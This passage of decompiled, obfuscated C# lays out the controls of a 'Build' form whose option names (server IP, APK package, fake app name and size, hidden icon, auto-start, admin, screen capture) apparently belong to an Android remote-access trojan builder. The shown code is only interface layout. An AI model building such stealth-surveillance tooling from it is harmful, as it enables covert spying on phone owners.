            num1 = (int) num2 * 1154026029 ^ 191873251;
            continue;
          case 1095:
            ((Build) this).sizelabel.Location = new Point(161, 328);
            num1 = (int) num2 * 868431941 ^ 356459240;
            continue;
          case 1096:
            ((Build) this).Panel2 = new Panel();
            ((Build) this).clonecheck = new DrakeUICheckBox();
            ((Build) this).TextVersion = new DrakeUITextBox();
            num1 = (int) num2 * 1165230880 ^ -171116856;
            continue;
          case 1097:
            ((Build) this).CheckAllPrims.StyleCustomMode = true;
            num1 = (int) num2 * -2114773590 ^ -667923142;
            continue;
          case 1098:
            ((Build) this).Panel1.Name = EXGuarder.\u0036D6B5E26;
            ((Build) this).Panel1.Size = new Size(450, 34);
            num1 = (int) num2 * -2073310454 ^ -455944596;
            continue;
          case 1099:
            ((Build) this).CheckHide.Visible = false;
            ((Build) this).CheckIconPatch.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).CheckIconPatch.Cursor = Cursors.Hand;
            ((Build) this).CheckIconPatch.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold);
            ((Build) this).CheckIconPatch.ForeColor = Color.White;
            num1 = (int) num2 * 1247062711 ^ 1177705757;
            continue;
          case 1100:
            ((Build) this).Panel5.Size = new Size(1004, 677);
            num1 = (int) num2 * -144212290 ^ -1301951802;
            continue;
          case 1101:
            ((Build) this).checkprotector.ForeColor = Color.White;
            num1 = (int) num2 * -1474959776 ^ 397903331;
            continue;
          case 1102:
            ((Build) this).Label4.Location = new Point(661, 354);
            num1 = (int) num2 * 146972803 ^ 817240285;
            continue;
          case 1103:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).CheckAllPrims);
            num1 = (int) num2 * -1425045812 ^ 1835482493;
            continue;
          case 1104:
            ((Build) this).Label16.AutoSize = true;
            ((Build) this).Label16.BackColor = Color.Transparent;
            num1 = (int) num2 * -1670451798 ^ -1427076091;
            continue;
          case 1105:
            ((Build) this).Textfakename.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -1805348606 ^ 1429238828;
            continue;
          case 1106:
            ((Build) this).Label46.Name = EXGuarder.\u0032A494D0F;
            num1 = (int) num2 * 1497665204 ^ -287406230;
            continue;
          case 1107:
            ((Build) this).Label10 = new Label();
            ((Build) this).CheckSkipre = new DrakeUICheckBox();
            num1 = (int) num2 * -1873633462 ^ 582603339;
            continue;
          case 1108:
            ((Build) this).TabPage9.Text = EXGuarder.\u0031A614706;
            num1 = (int) num2 * -1902655567 ^ -1446607692;
            continue;
          case 1109:
            ((Build) this).Label24.Text = EXGuarder.\u00370340333;
            num1 = (int) num2 * -1344601958 ^ 885039948;
            continue;
          case 1110:
            ((Build) this).Label12.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * -1591022086 ^ -1703847417;
            continue;
          case 1111:
            ((Build) this).TextBox1.Margin = new Padding(4);
            num1 = (int) num2 * -181955420 ^ -953044327;
            continue;
          case 1112:
            ((Build) this).Label32.TabIndex = 40;
            ((Build) this).Label32.Text = EXGuarder.\u003352E296C;
            num1 = (int) num2 * 1523923683 ^ -1615616003;
            continue;
          case 1113:
            ((Build) this).TextIP.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 551881184 ^ 1568248407;
            continue;
          case 1114:
            ((Build) this).trackIDtext.Watermark = EXGuarder.\u00355795518;
            num1 = (int) num2 * 1265992191 ^ -119015451;
            continue;
          case 1115:
            ((Build) this).clonecheck.Text = EXGuarder.\u003374F6314;
            num1 = (int) num2 * -356584425 ^ 1004300059;
            continue;
          case 1116:
            ((Build) this).DrakeUIAvatar2 = new DrakeUIAvatar();
            ((Build) this).trackIDtext = new DrakeUITextBox();
            num1 = (int) num2 * 1132769916 ^ -147062940;
            continue;
          case 1117:
            ((Build) this).Label1 = new Label();
            num1 = (int) num2 * -598469110 ^ 2116153780;
            continue;
          case 1118:
            ((Build) this).TABCTRL.TabUnSelectedForeColor = Color.FromArgb(240, 240, 240);
            ((Build) this).TabPage10.BackColor = Color.White;
            num1 = (int) num2 * 1233745741 ^ 1153138583;
            continue;
          case 1119:
            ((Build) this).SelectedApk.FillColor = Color.Transparent;
            ((Build) this).SelectedApk.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num2 * -1604557943 ^ 38872473;
            continue;
          case 1120:
            ((Build) this).Label9.TabIndex = 27;
            num1 = (int) num2 * -1501413997 ^ -98669851;
            continue;
          case 1121:
            ((Build) this).TabPage12.ResumeLayout(false);
            num1 = (int) num2 * 217003340 ^ -274653522;
            continue;
          case 1122:
            ((Build) this).Panel7.TabIndex = 53;
            num1 = (int) num2 * -270218313 ^ 375530057;
            continue;
          case 1123:
            ((Build) this).Label20.Name = EXGuarder.\u0036C260337;
            num1 = (int) num2 * 300017027 ^ 913566895;
            continue;
          case 1124:
            ((Build) this).Generaltext.FillColor = Color.Black;
            num1 = (int) num2 * 456665253 ^ 27650537;
            continue;
          case 1125:
            ((Build) this).bindCtitle.BorderStyle = BorderStyle.FixedSingle;
            ((Build) this).bindCtitle.Font = new Font(EXGuarder.\u00339780D77, 9f, FontStyle.Bold);
            num1 = (int) num2 * -307428263 ^ -938612642;
            continue;
          case 1126:
            ((Build) this).Label4.AutoSize = true;
            ((Build) this).Label4.BackColor = Color.Transparent;
            num1 = (int) num2 * -457728806 ^ -1561840062;
            continue;
          case 1127:
            ((Build) this).Label42 = new Label();
            ((Build) this).Label40 = new Label();
            num1 = (int) num2 * -247729624 ^ 2035484119;
            continue;
          case 1128:
            ((Build) this).tracklist.ForeColor = Color.Black;
            ((Build) this).tracklist.HoverColor = Color.Silver;
            num1 = (int) num2 * -1259638117 ^ -116161621;
            continue;
          case 1129:
            ((Build) this).Generaltext.Location = new Point(11, 276);
            num1 = (int) num2 * -1298494553 ^ -21041349;
            continue;
          case 1130:
            ((Build) this).checksignver.FillColor = Color.Black;
            ((Build) this).checksignver.Font = new Font(EXGuarder.\u00339780D77, 11f);
            num1 = (int) num2 * 1128891551 ^ 562535989;
            continue;
          case 1131:
            ((Build) this).dscriptext.TabIndex = 45;
            num1 = (int) num2 * 33766781 ^ -1957721893;
            continue;
          case 1132:
            ((Build) this).panemnitor.SuspendLayout();
            ((Build) this).Panel10.SuspendLayout();
            num1 = (int) num2 * 274525799 ^ 2064178962;
            continue;
          case 1133:
            ((Build) this).checkcaptureonce.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).checkcaptureonce.ForeColor = Color.White;
            ((Build) this).checkcaptureonce.Location = new Point(95, 66);
            num1 = (int) num2 * 250596588 ^ 2120604701;
            continue;
          case 1134:
            ((Build) this).combotype.Location = new Point(71, 162);
            ((Build) this).combotype.Margin = new Padding(4);
            num1 = (int) num2 * 464582798 ^ 413645094;
            continue;
          case 1135:
            ((Build) this).Label31.BackColor = Color.Transparent;
            num1 = (int) num2 * 473939413 ^ -1807499477;
            continue;
          case 1136:
            ((Build) this).combotype.DropDownStyle = UIDropDownStyle.DropDownList;
            ((Build) this).combotype.FillColor = Color.Black;
            ((Build) this).combotype.Font = new Font(EXGuarder.\u00339780D77, 11f);
            num1 = (int) num2 * 33784679 ^ 1166215100;
            continue;
          case 1137:
            ((Build) this).Label15.Name = EXGuarder.\u00304225628;
            num1 = (int) num2 * 1337640370 ^ 102716848;
            continue;
          case 1138:
            ((Build) this).randomverbtn.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 1916871234 ^ -942127957;
            continue;
          case 1139:
            ((Build) this).TABCTRL.MenuStyle = UIMenuStyle.Custom;
            ((Build) this).TABCTRL.Name = EXGuarder.\u0035F1A0342;
            num1 = (int) num2 * 354759722 ^ -1590765124;
            continue;
          case 1140:
            ((Build) this).Primslist.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -284610551 ^ -1290856442;
            continue;
          case 1141:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).namemonitor);
            num1 = (int) num2 * 1067646614 ^ -674650708;
            continue;
          case 1142:
            ((Build) this).Label1.AutoSize = true;
            num1 = (int) num2 * -1756362158 ^ -1118965616;
            continue;
          case 1143:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).randomverbtn);
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).randomidbtn);
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).TextPackage);
            num1 = (int) num2 * -237046315 ^ 2029920240;
            continue;
          case 1144:
            ((Build) this).Label7 = new Label();
            ((Build) this).Label5 = new Label();
            num1 = (int) num2 * -1799746928 ^ 1262054306;
            continue;
          case 1145:
            ((Build) this).Panel3.Size = new Size(1004, 677);
            num1 = (int) num2 * -1423150490 ^ -2099939460;
            continue;
          case 1146:
            ((Build) this).trackIDtext.Font = new Font(EXGuarder.\u00339780D77, 10f);
            num1 = (int) num2 * -808255226 ^ -1543239749;
            continue;
          case 1147:
            ((Build) this).Label36.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label36.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label36.Location = new Point(57, 235);
            num1 = (int) num2 * 660353771 ^ 1419932243;
            continue;
          case 1148:
            ((Build) this).Panel7.Size = new Size(450, 230);
            num1 = (int) num2 * 745682445 ^ -494795163;
            continue;
          case 1149:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label38);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checkadmin);
            num1 = (int) num2 * 725345288 ^ -1959182051;
            continue;
          case 1150:
            ((Build) this).Label26.Size = new Size(16, 19);
            ((Build) this).Label26.TabIndex = 103;
            num1 = (int) num2 * -89503502 ^ -69372101;
            continue;
          case 1151:
            ((Build) this).Label10.Name = EXGuarder.\u0032A390A2C;
            num1 = (int) num2 * 372861310 ^ -2016068748;
            continue;
          case 1152:
            ((Build) this).Label14.Name = EXGuarder.\u00301092970;
            num1 = (int) num2 * 1394514000 ^ -697924219;
            continue;
          case 1153:
            ((Build) this).Primslist.Style = UIStyle.Custom;
            num1 = (int) num2 * 1663241321 ^ -248701269;
            continue;
          case 1154:
            ((Build) this).Label11.AutoSize = true;
            num1 = (int) num2 * -741686579 ^ -512558054;
            continue;
          case 1155:
            ((Build) this).Primslist.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -79108935 ^ -820351724;
            continue;
          case 1156:
            ((Build) this).Panel4.Controls.Add((Control) ((Build) this).Notmsg);
            ((Build) this).Panel4.Location = new Point(436, 340);
            num1 = (int) num2 * 1880541737 ^ 37741447;
            continue;
          case 1157:
            ((Build) this).addactiv.Cursor = Cursors.Hand;
            ((Build) this).addactiv.FillColor = Color.Transparent;
            ((Build) this).addactiv.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * 1883730862 ^ 854111581;
            continue;
          case 1158:
            ((Build) this).namemonitor.Radius = 10;
            num1 = (int) num2 * -1959811611 ^ 613146314;
            continue;
          case 1159:
            ((Build) this).CheckIconPatch.Name = EXGuarder.\u0035F2D5E07;
            num1 = (int) num2 * -1146740852 ^ -1924283478;
            continue;
          case 1160:
            ((Build) this).Label22.Name = EXGuarder.\u00345364B3A;
            num1 = (int) num2 * 1734548745 ^ 404447803;
            continue;
          case 1161:
            ((Build) this).Panel5.Location = new Point(0, 0);
            num1 = (int) num2 * 936166306 ^ 207212170;
            continue;
          case 1162:
            ((Build) this).CheckDoze.Cursor = Cursors.Hand;
            ((Build) this).CheckDoze.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -464525788 ^ -541351836;
            continue;
          case 1163:
            ((Build) this).Label45.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label45.Name = EXGuarder.\u003014E0C4A;
            ((Build) this).Label45.Size = new Size(62, 24);
            num1 = (int) num2 * -109528631 ^ 1423082958;
            continue;
          case 1164:
            ((Build) this).checkver.Text = EXGuarder.\u00361740915;
            ((Build) this).checkver.TextAlignment = ContentAlignment.MiddleLeft;
            ((Build) this).Label48.BackColor = Color.Transparent;
            num1 = (int) num2 * 1338878153 ^ 699659682;
            continue;
          case 1165:
            ((Build) this).Label4.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1563255981 ^ 1393083071;
            continue;
          case 1166:
            ((Build) this).checksignver.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * 159178786 ^ -2060374683;
            continue;
          case 1167:
            ((Build) this).bndbtntext.TextAlignment = ContentAlignment.TopCenter;
            ((Build) this).bindbodytext.BackColor = Color.FromArgb(0, 0, 17);
            num1 = (int) num2 * 879654373 ^ 1378713405;
            continue;
          case 1168:
            ((Build) this).trakertitle.BackColor = Color.Transparent;
            ((Build) this).trakertitle.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -705486126 ^ -1203741877;
            continue;
          case 1169:
            ((Build) this).po.Watermark = EXGuarder.\u0030C0D7568;
            num1 = (int) num2 * 114741545 ^ -1520118981;
            continue;
          case 1170:
            ((Build) this).TextBox1.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * 40880747 ^ 1217846021;
            continue;
          case 1171:
            ((Build) this).logtitletext.BackColor = Color.FromArgb(38, 50, 56);
            num1 = (int) num2 * 1939203577 ^ -414942025;
            continue;
          case 1172:
            ((Build) this).Label16.Location = new Point(55, 200);
            num1 = (int) num2 * 943245799 ^ 1854625285;
            continue;
          case 1173:
            ((Build) this).CheckFakeSize.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).CheckFakeSize.ForeColor = Color.White;
            num1 = (int) num2 * -399603133 ^ -1143896083;
            continue;
          case 1174:
            ((Build) this).Primslist.FillColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num2 * -1126014676 ^ 1182701064;
            continue;
          case 1175:
            ((Build) this).TabPage11.SuspendLayout();
            ((Build) this).Panel5.SuspendLayout();
            num1 = (int) num2 * 1414961180 ^ 681077960;
            continue;
          case 1176:
            ((Build) this).Label26.Name = EXGuarder.\u00316653F38;
            num1 = (int) num2 * -630837699 ^ 1691297003;
            continue;
          case 1177:
            ((Build) this).CheckIconPatch.Location = new Point(566, 506);
            num1 = (int) num2 * -603317923 ^ -2102420395;
            continue;
          case 1178:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).Label2);
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).PictureBox1);
            num1 = (int) num2 * 1388469496 ^ -181580998;
            continue;
          case 1179:
            ((Build) this).checkautostart.Padding = new Padding(22, 0, 0, 0);
            ((Build) this).checkautostart.Size = new Size(338, 29);
            num1 = (int) num2 * -2082055904 ^ -2129723281;
            continue;
          case 1180:
            ((Build) this).bindCtitle.Size = new Size(275, 23);
            num1 = (int) num2 * -1245353016 ^ 2125786005;
            continue;
          case 1181:
            ((Build) this).PictureBox1.Margin = new Padding(4);
            num1 = (int) num2 * 2059537038 ^ 447753573;
            continue;
          case 1182:
            ((Build) this).explainoptionstext.ReadOnly = true;
            num1 = (int) num2 * -1954329966 ^ -381844763;
            continue;
          case 1183:
            ((Build) this).Label42.Location = new Point(455, 54);
            ((Build) this).Label42.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -2124720440 ^ -1187023296;
            continue;
          case 1184:
            ((Build) this).TextIP.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).TextIP.ForeColor = Color.White;
            ((Build) this).TextIP.Location = new Point(102, 108);
            ((Build) this).TextIP.Margin = new Padding(5, 6, 5, 6);
            ((Build) this).TextIP.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -1112265437 ^ -1093844804;
            continue;
          case 1185:
            ((Build) this).combotype.MinimumSize = new Size(63, 0);
            ((Build) this).combotype.Name = EXGuarder.\u003276B7831;
            num1 = (int) num2 * -943716459 ^ 907052167;
            continue;
          case 1186:
            ((Build) this).Label3.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label3.Name = EXGuarder.\u00371675B0F;
            num1 = (int) num2 * 1071373209 ^ 1279664613;
            continue;
          case 1187:
            ((Build) this).Label20.AutoSize = true;
            ((Build) this).Label20.BackColor = Color.Transparent;
            ((Build) this).Label20.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -572053686 ^ -906785948;
            continue;
          case 1188:
            ((Build) this).combotype.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -85759229 ^ -1932248646;
            continue;
          case 1189:
            ((Build) this).Label34.AutoSize = true;
            ((Build) this).Label34.BackColor = Color.Transparent;
            num1 = (int) num2 * 545114280 ^ 1931895845;
            continue;
          case 1190:
            ((Build) this).TextNamePatch.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -827219496 ^ -476602572;
            continue;
          case 1191:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label7);
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label5);
            num1 = (int) num2 * 1195113093 ^ 1236033587;
            continue;
          case 1192:
            ((Build) this).Label25.AutoSize = true;
            ((Build) this).Label25.BackColor = Color.Transparent;
            ((Build) this).Label25.Font = new Font(EXGuarder.\u00339780D77, 10f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 335155263 ^ -1869711463;
            continue;
          case 1193:
            ((Build) this).Label49.AutoSize = true;
            num1 = (int) num2 * 2075815985 ^ 367358302;
            continue;
          case 1194:
            ((Build) this).Panel4.ResumeLayout(false);
            num1 = (int) num2 * 582178460 ^ -1016997436;
            continue;
          case 1195:
            ((Build) this).checkemo.Location = new Point(83, 200);
            num1 = (int) num2 * -1564593702 ^ 41915620;
            continue;
          case 1196:
            ((Build) this).checkcatpure.Style = UIStyle.Custom;
            num1 = (int) num2 * 351402154 ^ -1629130716;
            continue;
          case 1197:
            ((Build) this).Label47.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1598879734 ^ -1576407542;
            continue;
          case 1198:
            ((Build) this).Label26.Text = EXGuarder.\u003500A6952;
            ((Build) this).removmonitor.AvatarSize = 30;
            num1 = (int) num2 * -1339323688 ^ -1543732138;
            continue;
          case 1199:
            ((Build) this).CheckHide.Text = EXGuarder.\u00370106B2B;
            num1 = (int) num2 * 1431829589 ^ 374019;
            continue;
          case 1200:
            ((Build) this).linkmonitor.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Build) this).linkmonitor.Size = new Size(262, 27);
            ((Build) this).linkmonitor.Style = UIStyle.Custom;
            ((Build) this).linkmonitor.TabIndex = 95;
            num1 = (int) num2 * 686990454 ^ 177061338;
            continue;
          case 1201:
            ((Build) this).TabPage14.SuspendLayout();
            num1 = (int) num2 * -898130710 ^ -669053577;
            continue;
          case 1202:
            ((Build) this).Label22.BackColor = Color.Transparent;
            num1 = (int) num2 * -1735700114 ^ -1779949835;
            continue;
          case 1203:
            ((Build) this).Label8.Location = new Point(12, 18);
            num1 = (int) num2 * 828277224 ^ 765884117;
            continue;
          case 1204:
            ((Build) this).trackIDtext.Radius = 10;
            ((Build) this).trackIDtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).trackIDtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 1592866468 ^ -954845628;
            continue;
          case 1205:
            ((Build) this).CheckSkipre.Name = EXGuarder.\u0036B6E0754;
            ((Build) this).CheckSkipre.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -996920608 ^ 345997007;
            continue;
          case 1206:
            ((Build) this).trackIDtext.ForeColor = Color.White;
            num1 = (int) num2 * -1075113871 ^ -1799476790;
            continue;
          case 1207:
            ((Build) this).Label13.Size = new Size(19, 24);
            ((Build) this).Label13.TabIndex = 73;
            ((Build) this).Label13.Text = EXGuarder.\u003500A6952;
            ((Build) this).explainoptionstext.AcceptsTab = true;
            num1 = (int) num2 * 1310319624 ^ -393081095;
            continue;
          case 1208:
            ((Build) this).panelmonitorb.ResumeLayout(false);
            num1 = (int) num2 * 1139009989 ^ -1649036153;
            continue;
          case 1209:
            ((Build) this).TextVersion.Size = new Size(262, 27);
            ((Build) this).TextVersion.Style = UIStyle.Custom;
            num1 = (int) num2 * 89826327 ^ -938177817;
            continue;
          case 1210:
            ((Build) this).bindbodytext.ForeColor = Color.White;
            num1 = (int) num2 * 1384558394 ^ -1390808743;
            continue;
          case 1211:
            ((Build) this).delayaccesstext.TextAlign = HorizontalAlignment.Center;
            num1 = (int) num2 * -908430032 ^ -1923321703;
            continue;
          case 1212:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).sizelabel);
            num1 = (int) num2 * -1948092917 ^ 1980605342;
            continue;
          case 1213:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label17);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label16);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label14);
            num1 = (int) num2 * -1618246560 ^ 312671077;
            continue;
          case 1214:
            ((Build) this).Label16.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * -368880570 ^ -216717925;
            continue;
          case 1215:
            ((Build) this).logtitletext = new TextBox();
            ((Build) this).PictureBox2 = new PictureBox();
            num1 = (int) num2 * -1962737789 ^ -1807089904;
            continue;
          case 1216:
            ((Build) this).CheckHidePrims.CheckBoxColor = Color.FromArgb(192, 0, 0);
            num1 = (int) num2 * 1769146566 ^ 88824103;
            continue;
          case 1217:
            ((Build) this).Label35.Text = EXGuarder.\u003500A6952;
            ((Build) this).explaintoolstext.AcceptsTab = true;
            num1 = (int) num2 * 1692757369 ^ 1293278362;
            continue;
          case 1218:
            ((Build) this).Generaltext.Font = new Font(EXGuarder.\u0036C4E7613, 12f);
            num1 = (int) num2 * 177124813 ^ -477150543;
            continue;
          case 1219:
            ((Build) this).Button1.RectPressColor = Color.White;
            ((Build) this).Button1.RectSelectedColor = Color.White;
            ((Build) this).Button1.Size = new Size(156, 32);
            num1 = (int) num2 * 2140143260 ^ -100296958;
            continue;
          case 1220:
            ((Build) this).CheckBIND.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1812793669 ^ 1447106421;
            continue;
          case 1221:
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).Label41);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).checkkeepsscreen);
            ((Build) this).Panel5.Controls.Add((Control) ((Build) this).CheckHidePrims);
            num1 = (int) num2 * 205101519 ^ -301938905;
            continue;
          case 1222:
            ((Build) this).bndbtntext.Text = EXGuarder.\u0031E512C12;
            num1 = (int) num2 * -295987994 ^ 1019305480;
            continue;
          case 1223:
            ((Build) this).namemonitor.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 2141852150 ^ -1919240645;
            continue;
          case 1224:
            ((Build) this).TextPackage.Radius = 10;
            num1 = (int) num2 * -997546384 ^ 1769100802;
            continue;
          case 1225:
            ((Build) this).randomidbtn.Location = new Point(886, 393);
            num1 = (int) num2 * 1710764549 ^ 1101608180;
            continue;
          case 1226:
            ((Build) this).Label15.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1158573884 ^ -560797734;
            continue;
          case 1227:
            this.Margin = new Padding(4, 5, 4, 5);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            num1 = (int) num2 * 152708894 ^ 1436158056;
            continue;
          case 1228:
            ((Build) this).CheckRecord.Style = UIStyle.Custom;
            ((Build) this).CheckRecord.TabIndex = 73;
            ((Build) this).CheckRecord.Text = EXGuarder.\u003572D3B6A;
            ((Build) this).CheckRecord.Visible = false;
            ((Build) this).TabPage12.BackColor = Color.White;
            num1 = (int) num2 * 1350092032 ^ 172457601;
            continue;
          case 1229:
            ((Build) this).CheckFakeSize.TabIndex = 47;
            num1 = (int) num2 * -1916955527 ^ 1655623883;
            continue;
          case 1230:
            ((Build) this).Label22.Size = new Size(69, 17);
            num1 = (int) num2 * 1707923937 ^ 291072979;
            continue;
          case 1231:
            ((Build) this).explainoptionstext = new TextBox();
            num1 = (int) num2 * 134431549 ^ -1520346431;
            continue;
          case 1232:
            ((Build) this).comboproms.TextAlignment = ContentAlignment.MiddleLeft;
            ((Build) this).Panel8.BackColor = Color.Black;
            num1 = (int) num2 * -296813046 ^ 461531492;
            continue;
          case 1233:
            ((Build) this).CheckFakeSize = new DrakeUICheckBox();
            ((Build) this).TabPage11 = new TabPage();
            num1 = (int) num2 * -118361729 ^ 1221044677;
            continue;
          case 1234:
            ((Build) this).Label9.Text = EXGuarder.\u00315122F19;
            num1 = (int) num2 * 1038893431 ^ -1811438970;
            continue;
          case 1235:
            ((Build) this).Panel4.PerformLayout();
            ((Build) this).fakepanel.ResumeLayout(false);
            num1 = (int) num2 * 1643297700 ^ -1519598552;
            continue;
          case 1236:
            ((Build) this).Label22.Font = new Font(EXGuarder.\u00339780D77, 10f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1760664041 ^ -2069292289;
            continue;
          case 1237:
            ((Build) this).CheckQuick.Style = UIStyle.Custom;
            ((Build) this).CheckQuick.TabIndex = 70;
            ((Build) this).CheckQuick.Text = EXGuarder.\u00308450B5E;
            ((Build) this).Label35.AutoSize = true;
            ((Build) this).Label35.BackColor = Color.Transparent;
            num1 = (int) num2 * -1705662790 ^ 143264123;
            continue;
          case 1238:
            ((Build) this).Label30.ForeColor = Color.White;
            num1 = (int) num2 * -1912767129 ^ -580143809;
            continue;
          case 1239:
            ((Build) this).Label44.BackColor = Color.Transparent;
            ((Build) this).Label44.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -382300822 ^ -1560283686;
            continue;
          case 1240:
            ((Build) this).Label4.Size = new Size(132, 24);
            num1 = (int) num2 * -1692079588 ^ -1375674779;
            continue;
          case 1241:
            ((Build) this).Label7.AutoSize = true;
            num1 = (int) num2 * 839141912 ^ 218969885;
            continue;
          case 1242:
            ((Build) this).Label3 = new Label();
            num1 = (int) num2 * -2008998279 ^ -620275021;
            continue;
          case 1243:
            ((Build) this).removmonitor.Text = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * -332016789 ^ 23591481;
            continue;
          case 1244:
            ((Build) this).Generaltext.LineColor = Color.Red;
            num1 = (int) num2 * 718900712 ^ 1042870324;
            continue;
          case 1245:
            ((Build) this).bindCtitle.Location = new Point(644, 191);
            ((Build) this).bindCtitle.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * -1431531471 ^ -1906837283;
            continue;
          case 1246:
            ((Build) this).logbodytext.Size = new Size(452, 130);
            num1 = (int) num2 * -1262129693 ^ 1155712163;
            continue;
          case 1247:
            ((Build) this).removmonitor.Cursor = Cursors.Hand;
            num1 = (int) num2 * -673801227 ^ 1202925363;
            continue;
          case 1248:
            ((Build) this).CheckAllPrims.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1825307752 ^ 1578603675;
            continue;
          case 1249:
            ((Build) this).Nottitle.TextAlign = HorizontalAlignment.Center;
            num1 = (int) num2 * 639916212 ^ 2085019677;
            continue;
          case 1250:
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).Textfakename);
            num1 = (int) num2 * 1585508571 ^ -1948397722;
            continue;
          case 1251:
            ((Build) this).checkcaptureonce.Size = new Size(196, 29);
            num1 = (int) num2 * 756018165 ^ -587496450;
            continue;
          case 1252:
            ((Build) this).checknetwork.TabIndex = 103;
            num1 = (int) num2 * -520396379 ^ -963377916;
            continue;
          case 1253:
            ((Build) this).Notmsg.Margin = new Padding(4);
            ((Build) this).Notmsg.Name = EXGuarder.\u0035D123855;
            num1 = (int) num2 * 1853690657 ^ -1178938864;
            continue;
          case 1254:
            ((Build) this).Label25.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1488571300 ^ -325420669;
            continue;
          case 1255:
            ((Build) this).Label11.Text = EXGuarder.\u003500A6952;
            ((Build) this).CheckAOX.CheckBoxColor = Color.FromArgb(192, 0, 0);
            num1 = (int) num2 * 994965061 ^ -698944291;
            continue;
          case 1256:
            ((Build) this).checkprotector.Cursor = Cursors.Hand;
            num1 = (int) num2 * -666851313 ^ -507348176;
            continue;
          case 1257:
            ((Build) this).TextNamePatch.Cursor = Cursors.IBeam;
            num1 = (int) num2 * -174955521 ^ -2009663738;
            continue;
          case 1258:
            ((Build) this).trakertitle.Text = EXGuarder.\u0031E695A4D;
            num1 = (int) num2 * 445591528 ^ 1577003704;
            continue;
          case 1259:
            ((Build) this).Label13.Location = new Point(37, 329);
            num1 = (int) num2 * -1871445630 ^ 1264117044;
            continue;
          case 1260:
            ((Build) this).CheckDraw.ForeColor = Color.White;
            num1 = (int) num2 * -1518133516 ^ 1477923447;
            continue;
          case 1261:
            ((Build) this).checkautostart.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -2103441472 ^ 139223882;
            continue;
          case 1262:
            ((Build) this).TabPage12.Location = new Point(0, 40);
            ((Build) this).TabPage12.Name = EXGuarder.\u003764C1442;
            num1 = (int) num2 * 315227026 ^ -1312300155;
            continue;
          case 1263:
            ((Build) this).Label33.Name = EXGuarder.\u0032666502E;
            ((Build) this).Label33.Size = new Size(16, 19);
            num1 = (int) num2 * -24973328 ^ -1798102146;
            continue;
          case 1264:
            ((Build) this).checkprotector.Padding = new Padding(22, 0, 0, 0);
